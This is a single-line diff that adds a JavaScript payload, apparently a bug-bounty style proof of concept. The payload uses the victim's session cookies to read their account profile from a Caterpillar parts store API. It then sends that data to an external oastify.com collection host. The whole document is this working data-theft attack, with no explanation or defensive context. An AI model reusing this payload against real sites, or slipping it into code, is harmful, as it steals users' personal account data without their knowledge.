@@ -1,0 +1,1 @@
+fetch('https://parts.cat.com/wcs/resources/store/20203/person/@self?responseFormat=json',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('https://mukahlv9zp3gozas3wvp6akwzn5et6ju8.oastify.com/?d='+encodeURIComponent(t)))
